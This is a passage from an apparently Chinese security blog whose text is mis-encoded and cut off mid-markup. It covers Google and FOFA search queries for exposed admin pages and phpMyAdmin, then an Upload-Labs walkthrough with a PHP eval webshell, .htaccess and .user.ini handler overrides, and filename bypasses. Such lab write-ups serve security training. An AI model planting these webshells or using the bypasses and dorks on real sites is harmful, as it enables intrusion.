href="#æŸ¥æ‰¾æ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="æŸ¥æ‰¾æ•æ„Ÿä¿¡æ¯æ³„éœ²"></a>æŸ¥æ‰¾æ•æ„Ÿä¿¡æ¯æ³„éœ²</h3><p>intitle:â€Index of /adminâ€</p><p>intitle:â€Index of /rootâ€</p><p>intitle:â€Index of /â€œ +password.txt</p><p>intitle:phpinfo()æˆ–è€…inurl:phpinfo.php</p><h3 id="æŸ¥æ‰¾æœªæˆæƒè®¿é—®phpmyadmin"><a href="#æŸ¥æ‰¾æœªæˆæƒè®¿é—®phpmyadmin" class="headerlink" title="æŸ¥æ‰¾æœªæˆæƒè®¿é—®phpmyadmin"></a>æŸ¥æ‰¾æœªæˆæƒè®¿é—®phpmyadmin</h3><p>inurl:.php? intext:CHARACTER_SETS,COLLATIONS, ?intitle:phpmyadmin</p><h2 id="ä¸‰ã€ç½‘ç»œç©ºé—´æœç´¢å¼•æ“çš„ä½¿ç”¨"><a href="#ä¸‰ã€ç½‘ç»œç©ºé—´æœç´¢å¼•æ“çš„ä½¿ç”¨" class="headerlink" title="ä¸‰ã€ç½‘ç»œç©ºé—´æœç´¢å¼•æ“çš„ä½¿ç”¨"></a>ä¸‰ã€ç½‘ç»œç©ºé—´æœç´¢å¼•æ“çš„ä½¿ç”¨</h2><h3 id="ç®€ä»‹ï¼š"><a href="#ç®€ä»‹ï¼š" class="headerlink" title="ç®€ä»‹ï¼š"></a>ç®€ä»‹ï¼š</h3><p>FOFA æ˜¯ç™½å¸½æ±‡æ¨å‡ºçš„ä¸€æ¬¾ç½‘ç»œç©ºé—´æœç´¢å¼•æ“,å®ƒé€šè¿‡è¿›è¡Œç½‘ç»œç©ºé—´æµ‹ç»˜,èƒ½å¤Ÿå¸®åŠ©ç ”ç©¶äººå‘˜æˆ–è€…ä¼ä¸šè¿…é€Ÿè¿›è¡Œç½‘ç»œèµ„äº§åŒ¹é…,ä¾‹å¦‚è¿›è¡Œæ¼æ´å½±å“èŒƒå›´åˆ†æã€åº”ç”¨åˆ†å¸ƒç»Ÿè®¡ã€åº”ç”¨æµè¡Œåº¦ç­‰ã€‚</p><p>FOFA æœç´¢å¼•æ“æ£€ç´¢åˆ°çš„å†…å®¹ä¸»è¦æ˜¯æœåŠ¡å™¨ï¼Œæ•°æ®åº“ï¼ŒæŸä¸ªç½‘ç«™ç®¡ç†åå°ï¼Œè·¯ç”±å™¨ï¼Œäº¤æ¢æœºï¼Œå…¬å…±IPçš„æ‰“å°æœºï¼Œç½‘ç»œæ‘„åƒå¤´ï¼Œé—¨ç¦ç³»ç»Ÿï¼ŒWebæœåŠ¡ â€¦â€¦</p><p>ç½‘å€ï¼š<a href="https://fofa.so/" target="_blank" rel="noopener">https://fofa.so/</a></p><h3 id="FOFAæ€ä¹ˆç”¨ï¼Ÿ"><a href="#FOFAæ€ä¹ˆç”¨ï¼Ÿ" class="headerlink" title="FOFAæ€ä¹ˆç”¨ï¼Ÿ"></a>FOFAæ€ä¹ˆç”¨ï¼Ÿ</h3><p>FOFAæŸ¥è¯¢è¯­æ³•ï¼Œç±»ä¼¼è°·æ­Œè¯­æ³•ï¼ŒFOFAçš„è¯­æ³•ä¹Ÿæ˜¯ç®€å•æ˜“æ‡‚ï¼Œä¸»è¦åˆ†ä¸ºæ£€ç´¢å­—æ®µä»¥åŠè¿ç®—ç¬¦ï¼Œæ‰€æœ‰çš„æŸ¥è¯¢è¯­å¥éƒ½æ˜¯ç”±è¿™ä¸¤ç§å…ƒç´ ç»„æˆçš„ã€‚</p><p>å¸¸ç”¨è¯­æ³•ï¼š</p><p>1ã€domain= â€œqq.comâ€    //æœç´¢qq.comæ‰€æœ‰çš„å­åŸŸå</p><p>2ã€host=â€edu.cnâ€      //ä»urlä¸­æœç´¢edu.cn</p><p>3ã€ip= â€œ11.1.1.1â€     //æœç´¢ip</p><p>4ã€server=â€apacheâ€     //æœç´¢æœåŠ¡æ˜¯apacheçš„ç½‘ç«™</p><p>5ã€os=â€windowsâ€      //æœç´ æ“ä½œç³»ç»Ÿæ˜¯windowsçš„ç½‘ç«™</p><p>6ã€port=3306 æˆ–è€… protocol==â€mysqlâ€ //æœç´¢mysqlæ•°æ®åº“çš„ç½‘ç«™</p><p>7ã€app=â€è‡´è¿œâ€    //æœç´¢è‡´è¿œoaåŠå…¬ç³»ç»Ÿæ­å»ºçš„ç½‘ç«™ï¼Œè¿˜å¯ä»¥æœè®¾å¤‡ï¼Œæ¯”å¦‚ç›‘æ§çš„</p><p>8ã€title=â€ç™»é™†â€      //ä»æ ‡é¢˜ä¸­æœç´¢ç™»é™†</p><p>9ã€header=â€thinkphpâ€    //ä»httpçš„å¤´é‡Œé¢æœthinkphp</p><p><a href="https://www.aqniu.com/tools-tech/20899.html" target="_blank" rel="noopener">è¯¦ç»†ä½¿ç”¨æ•™ç¨‹</a></p>]]></content>
      
      
      <categories>
          
          <category> æœç´¢è¯­æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Google </tag>
            
            <tag> fofa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Upload-Labs</title>
      <link href="/2021/01/17/upload-labs/"/>
      <url>/2021/01/17/upload-labs/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1433562661&auto=1&height=66"></iframe><h1 id="çŸ¥è¯†è¡¥å……ï¼š"><a href="#çŸ¥è¯†è¡¥å……ï¼š" class="headerlink" title="çŸ¥è¯†è¡¥å……ï¼š"></a>çŸ¥è¯†è¡¥å……ï¼š</h1><p><a href="https://blog.csdn.net/weixin_44519789/article/details/116570426?utm_source=app&app_version=4.7.1&code=app_1562916241&uLinkId=usr1mkqgl919blen" target="_blank" rel="noopener">å¤ªå‰å®³äº†ï¼Œç»ˆäºæœ‰äººèƒ½æŠŠæ–‡ä»¶ä¸Šä¼ æ¼æ´è®²çš„æ˜æ˜ç™½ç™½äº†</a></p><h1 id="è€ƒç‚¹æ€»ç»“ï¼š"><a href="#è€ƒç‚¹æ€»ç»“ï¼š" class="headerlink" title="è€ƒç‚¹æ€»ç»“ï¼š"></a>è€ƒç‚¹æ€»ç»“ï¼š</h1><p>1.å®¢æˆ·ç«¯çš„jséªŒè¯ï¼šmimeç±»å‹ï¼Œæ–‡ä»¶å†…å®¹ï¼Œæ–‡ä»¶æ‰©å±•åï¼ˆJavaScript switcheræˆ–noscriptï¼‰</p><p>2.æ£€æµ‹æ–‡ä»¶å¹»æ•°çš„ç»•è¿‡ï¼ˆå›¾ç‰‡é©¬ï¼‰ï¼š</p><ul><li><code>JPG: FF D8 FF EO 00 10 4A 46 49 46.</code></li><li><code>GIF:47 49 46 3839 61(GIF89a).</code></li><li><code>PNG:89 50 4E 47</code></li></ul><p>3.æœåŠ¡ç«¯æ‰©å±•åé»‘åå•</p><p>4.é’ˆå¯¹æ“ä½œç³»ç»Ÿçš„è§£ææ¼æ´ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/202105192330536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å…·ä½“å¯ä»¥é€šè¿‡ä¸Šæ–¹é“¾æ¥äº†è§£</p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p><code>upload-labs</code>æ˜¯ä¸€ä¸ªä½¿ç”¨<code>php</code>è¯­è¨€ç¼–å†™çš„ï¼Œä¸“é—¨æ”¶é›†æ¸—é€æµ‹è¯•å’ŒCTFä¸­é‡åˆ°çš„å„ç§ä¸Šä¼ æ¼æ´çš„é¶åœºã€‚æ—¨åœ¨å¸®åŠ©å¤§å®¶å¯¹ä¸Šä¼ æ¼æ´æœ‰ä¸€ä¸ªå…¨é¢çš„äº†è§£ã€‚ç›®å‰ä¸€å…±20å…³ï¼Œæ¯ä¸€å…³éƒ½åŒ…å«ç€ä¸åŒä¸Šä¼ æ–¹å¼ã€‚</p><h1 id="PASS-01"><a href="#PASS-01" class="headerlink" title="PASS-01"></a>PASS-01</h1><p>é—®é¢˜ï¼šè¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ .jpg|.png|.gifç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š.php</p><p>è§£å†³ï¼šbpæŠ“åŒ…ï¼Œå‘ç°æŠ“ä¸åˆ°ï¼Œè¯´æ˜æ˜¯å‰ç«¯æ£€æµ‹</p><pre><code>Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;666.php&quot;Content-Type: image/jpeg&lt;?php @eval($_POST[&#39;666&#39;]);?&gt;</code></pre><p>æ³¨æ„èšå‰‘è¿æ¥çš„æ—¶å€™è·¯å¾„ä¸ºï¼š/upload/666.php</p><h1 id="PASS-02"><a href="#PASS-02" class="headerlink" title="PASS-02"></a>PASS-02</h1><p>æç¤ºï¼šæœ¬passåœ¨æœåŠ¡ç«¯å¯¹æ•°æ®åŒ…çš„MIMEè¿›è¡Œæ£€æŸ¥ï¼</p><p>é‡ç‚¹åœ¨äº<strong>Content-Type: image/jpeg</strong></p><h1 id="PASS-03"><a href="#PASS-03" class="headerlink" title="PASS-03"></a>PASS-03</h1><p>hintsï¼šæœ¬passç¦æ­¢ä¸Šä¼ .asp|.aspx|.php|.jspåç¼€æ–‡ä»¶ï¼         </p><p>è§£å†³(è§£ææ¼æ´)ï¼šç”¨PHP çš„åˆ«åè¿›è¡Œé»‘åå•ç»•è¿‡ï¼Œå¦‚ php2, php3, php4, php5, phps, pht, phtm, phtml</p><h1 id="PASS-04"><a href="#PASS-04" class="headerlink" title="PASS-04"></a>PASS-04</h1><ul><li>åœ¨apacheé‡Œï¼Œè¿™ä¸ªæ–‡ä»¶ä½œä¸ºä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå¯ä»¥ç”¨æ¥æ§åˆ¶æ‰€åœ¨ç›®å½•çš„è®¿é—®æƒé™ä»¥åŠè§£æè®¾ç½®ã€‚å³æ˜¯ï¼Œå¯ä»¥é€šè¿‡è®¾ç½®å¯ä»¥å°†è¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ä½œä¸ºphpæ–‡ä»¶æ¥è§£æ</li><li>.htaccesså¯ä»¥å†™å…¥apacheé…ç½®ä¿¡æ¯ï¼Œæ”¹å˜å½“å‰ç›®å½•ä»¥åŠå­ç›®å½•çš„Apacheé…ç½®ä¿¡æ¯ã€‚</li><li>å‰ææ¡ä»¶ï¼š é…ç½®ä¸Šå…è®¸.htaccessç”Ÿæ•ˆ<br>Apacheå¼€å¯rewriteæ¨¡å—<br>.apacheé…ç½®æ–‡ä»¶ä¸ºAllowOverride All(é»˜è®¤ä¸ºNone)</li></ul><h2 id="æ–¹æ³•ä¸€ï¼š"><a href="#æ–¹æ³•ä¸€ï¼š" class="headerlink" title="æ–¹æ³•ä¸€ï¼š"></a>æ–¹æ³•ä¸€ï¼š</h2><p>.htaccessçš„è®¾ç½®ï¼š</p><pre><code>&lt;FilesMatch &quot;1.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p>è¿™é‡Œè¦ä¸Šä¼ çš„æ–‡ä»¶åå­—ä¸º1.jpg</p><h2 id="æ–¹æ³•äºŒï¼š"><a href="#æ–¹æ³•äºŒï¼š" class="headerlink" title="æ–¹æ³•äºŒï¼š"></a>æ–¹æ³•äºŒï¼š</h2><pre><code>AddType application/x-httpd-php.jpg</code></pre><p> æ‰€æœ‰jpgåç¥­éƒ½ä¼šèƒŒå½“åšPHPè§£æ</p><h1 id="PASS-05ï¼ˆç†è®ºä¸Šæ­¤å…³ä¸å­˜åœ¨ï¼‰"><a href="#PASS-05ï¼ˆç†è®ºä¸Šæ­¤å…³ä¸å­˜åœ¨ï¼‰" class="headerlink" title="PASS-05ï¼ˆç†è®ºä¸Šæ­¤å…³ä¸å­˜åœ¨ï¼‰"></a>PASS-05ï¼ˆç†è®ºä¸Šæ­¤å…³ä¸å­˜åœ¨ï¼‰</h1><p>hintsï¼šä¸Šä¼ ç›®å½•å­˜åœ¨phpæ–‡ä»¶ï¼ˆreadme.phpï¼‰</p><p><a href="https://blog.csdn.net/fdipzone/article/details/39064001" target="_blank" rel="noopener">ä¸Šä¼ .user.iniæ–‡ä»¶</a></p><p>php.iniä¸­æœ‰ä¸¤é¡¹<br> <strong>auto_prepend_file</strong> åœ¨é¡µé¢é¡¶éƒ¨åŠ è½½æ–‡ä»¶<strong>auto_append_file</strong>  åœ¨é¡µé¢åº•éƒ¨åŠ è½½æ–‡ä»¶</p><p>.user.iniæ–‡ä»¶å†…å®¹ï¼š</p><pre><code>auto_prepend_file=1.jpg</code></pre><p>å°šæœªæˆåŠŸï¼Œåº”è¯¥ä¸ç‰ˆæœ¬æœ‰å…³</p><h1 id="PASS-06"><a href="#PASS-06" class="headerlink" title="PASS-06"></a>PASS-06</h1><p>æŸ¥çœ‹æºç ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">".php"</span><span class="token punctuation">,</span><span class="token string">".php5"</span><span class="token punctuation">,</span><span class="token string">".php4"</span><span class="token punctuation">,</span><span class="token string">".php3"</span><span class="token punctuation">,</span><span class="token string">".php2"</span><span class="token punctuation">,</span><span class="token string">".html"</span><span class="token punctuation">,</span><span class="token string">".htm"</span><span class="token punctuation">,</span><span class="token string">".phtml"</span><span class="token punctuation">,</span><span class="token string">".pht"</span><span class="token punctuation">,</span><span class="token string">".pHp"</span><span class="token punctuation">,</span><span class="token string">".pHp5"</span><span class="token punctuation">,</span><span class="token string">".pHp4"</span><span class="token punctuation">,</span><span class="token string">".pHp3"</span><span class="token punctuation">,</span><span class="token string">".pHp2"</span><span class="token punctuation">,</span><span class="token string">".Html"</span><span class="token punctuation">,</span><span class="token string">".Htm"</span><span class="token punctuation">,</span><span class="token string">".pHtml"</span><span class="token punctuation">,</span><span class="token string">".jsp"</span><span class="token punctuation">,</span><span class="token string">".jspa"</span><span class="token punctuation">,</span><span class="token string">".jspx"</span><span class="token punctuation">,</span><span class="token string">".jsw"</span><span class="token punctuation">,</span><span class="token string">".jsv"</span><span class="token punctuation">,</span><span class="token string">".jspf"</span><span class="token punctuation">,</span><span class="token string">".jtml"</span><span class="token punctuation">,</span><span class="token string">".jSp"</span><span class="token punctuation">,</span><span class="token string">".jSpx"</span><span class="token punctuation">,</span><span class="token string">".jSpa"</span><span class="token punctuation">,</span><span class="token string">".jSw"</span><span class="token punctuation">,</span><span class="token string">".jSv"</span><span class="token punctuation">,</span><span class="token string">".jSpf"</span><span class="token punctuation">,</span><span class="token string">".jHtml"</span><span class="token punctuation">,</span><span class="token string">".asp"</span><span class="token punctuation">,</span><span class="token string">".aspx"</span><span class="token punctuation">,</span><span class="token string">".asa"</span><span class="token punctuation">,</span><span class="token string">".asax"</span><span class="token punctuation">,</span><span class="token string">".ascx"</span><span class="token punctuation">,</span><span class="token string">".ashx"</span><span class="token punctuation">,</span><span class="token string">".asmx"</span><span class="token punctuation">,</span><span class="token string">".cer"</span><span class="token punctuation">,</span><span class="token string">".aSp"</span><span class="token punctuation">,</span><span class="token string">".aSpx"</span><span class="token punctuation">,</span><span class="token string">".aSa"</span><span class="token punctuation">,</span><span class="token string">".aSax"</span><span class="token punctuation">,</span><span class="token string">".aScx"</span><span class="token punctuation">,</span><span class="token string">".aShx"</span><span class="token punctuation">,</span><span class="token string">".aSmx"</span><span class="token punctuation">,</span><span class="token string">".cEr"</span><span class="token punctuation">,</span><span class="token string">".sWf"</span><span class="token punctuation">,</span><span class="token string">".swf"</span><span class="token punctuation">,</span><span class="token string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//é¦–å°¾å»ç©º</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'ä¸Šä¼ å‡ºé”™ï¼'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‡ ä¹è¿‡æ»¤äº†æ‰€æœ‰çš„åç¼€ï¼Œä½†å´å…è®¸å¤§å°å†™é€ƒé€¸ï¼Œæ‰€æœ‰æ²¡æœ‰å¯¹phPè¿›è¡Œè¿‡æ»¤ï¼</p><p>è®¿é—®ï¼š</p><pre><code>http://127.0.0.1/upload-labs/upload/1.php</code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$_FILES</span>è¿™ä¸ªå˜é‡ç”¨ä¸ä¸Šä¼ çš„æ–‡ä»¶å‚æ•°è®¾ç½®ï¼Œæ˜¯ä¸€ä¸ªå¤šç»´æ•°ç»„æ•°ç»„çš„ç”¨æ³•å°±æ˜¯ <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span>æ˜¯ä½ è¡¨å•ä¸Šä¼ çš„æ–‡ä»¶ä¿¡æ¯æ•°ç»„ï¼Œupfileæ˜¯æ–‡ä»¶ä¸Šä¼ å­—æ®µï¼Œåœ¨ä¸Šä¼ æ—¶ç”±æœåŠ¡å™¨æ ¹æ®ä¸Šä¼ å­—æ®µè®¾å®šã€‚<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span>åŒ…å«äº†ä»¥ä¸‹å†…å®¹<span class="token punctuation">:</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> å®¢æˆ·ç«¯æ–‡ä»¶çš„åŸåç§°ã€‚<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> æ–‡ä»¶çš„ <span class="token constant">MIME</span> ç±»å‹ï¼Œéœ€è¦æµè§ˆå™¨æä¾›è¯¥ä¿¡æ¯çš„æ”¯æŒï¼Œä¾‹å¦‚<span class="token string">"image/gif"</span>ã€‚<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'size'</span><span class="token punctuation">]</span> å·²ä¸Šä¼ æ–‡ä»¶çš„å¤§å°ï¼Œå•ä½ä¸ºå­—èŠ‚ã€‚<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span> æ–‡ä»¶è¢«ä¸Šä¼ ååœ¨æœåŠ¡ç«¯å‚¨å­˜çš„ä¸´æ—¶æ–‡ä»¶åã€‚<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span> å’Œè¯¥æ–‡ä»¶ä¸Šä¼ ç›¸å…³çš„é”™è¯¯ä»£ç ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="PASS-07"><a href="#PASS-07" class="headerlink" title="PASS-07"></a>PASS-07</h1><p>hintsï¼šæœ¬passç¦æ­¢ä¸Šä¼ .php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1</p><p>|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml</p><p>|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx</p><p>|.cEr|.sWf|.swf|.htaccessåç¼€æ–‡ä»¶ï¼</p><p>ä¸ç¬¬å…­å…³ç›¸æ¯”ç¼ºå°‘ï¼š</p><pre><code>$file_ext = trim($file_ext); //é¦–å°¾å»ç©º</code></pre><ul><li>åˆ©ç”¨<code>windowå¯¹äºæ–‡ä»¶å’Œæ–‡ä»¶åçš„é™åˆ¶</code>ï¼Œä»¥ä¸‹å­—ç¬¦æ”¾åœ¨ç»“å°¾æ—¶ï¼Œä¸ç¬¦åˆæ“ä½œç³»ç»Ÿçš„å‘½åè§„èŒƒ,åœ¨æœ€åç”Ÿæˆæ–‡ä»¶æ—¶ï¼Œ<code>å­—ç¬¦ä¼šè¢«è‡ªåŠ¨å»é™¤</code>ã€‚</li></ul><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210518214952407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ‰€ä»¥é€šè¿‡æŠ“åŒ…åœ¨1.phpæ–‡ä»¶åé¢åŠ ä¸€ä¸ªç©ºæ ¼å°±å¯ä»¥é€ƒé€¸</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210518215322209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="PASS-08"><a href="#PASS-08" class="headerlink" title="PASS-08"></a>PASS-08</h1><p>hintsï¼šæœ¬passç¦æ­¢ä¸Šä¼ æ‰€æœ‰å¯ä»¥è§£æçš„åç¼€ï¼</p><p>ç¼ºå°‘ï¼š</p><pre><code>$file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</code></pre><p>æ‰€ä»¥åˆ©ç”¨1.php.æ¥è¿›è¡Œé€ƒé€¸</p><h1 id="PASS-09"><a href="#PASS-09" class="headerlink" title="PASS-09"></a>PASS-09</h1><p>ç›¸æ¯”ç¬¬å…«å…³ç¼ºå°‘ï¼š</p><pre><code> $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA</code></pre><p>::$DATAä½œç”¨ï¼šphpåœ¨windowsä¸­å¦‚æœæ–‡ä»¶å+â€::$DATAâ€ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€å.ä¸”ä¿æŒâ€::$DATAâ€ä¹‹å‰çš„æ–‡ä»¶å(Windowsæ–‡ä»¶æµç‰¹æ€§)</p><p>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬çš„.phpåç¼€æ–‡ä»¶ï¼ŒæŠ“åŒ…åŠ ::$DATAï¼Œä¸Šä¼ æˆåŠŸï¼Œèšå‰‘è¿æ¥ï¼ˆè¿æ¥çš„æ—¶å€™è¦æŠŠæ–‡ä»¶åçš„::$DATAå»æ‰ï¼‰</p><h1 id="PASS-10"><a href="#PASS-10" class="headerlink" title="PASS-10"></a>PASS-10</h1><p>hintsï¼šæœ¬passåªå…è®¸ä¸Šä¼ .jpg|.png|.gifåç¼€çš„æ–‡ä»¶ï¼</p><p>è€ƒå¯Ÿç‚¹  .[ç©ºæ ¼].ç»•è¿‡</p><p>ä¸ä¸Šä¸€å…³åŒºåˆ«ï¼š</p><pre><code>$img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;</code></pre><p>æ³¨æ„æ‹¼æ¥éƒ¨åˆ†<code>$img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;</code>æœ€åä¿å­˜çš„æ˜¯åŸå§‹æ–‡ä»¶ï¼Œè€Œä¸æ˜¯ç»è¿‡æ£€æµ‹çš„æ–‡ä»¶</p><p>ä¸Šä¼ 1.php. .</p><h1 id="PASS-11"><a href="#PASS-11" class="headerlink" 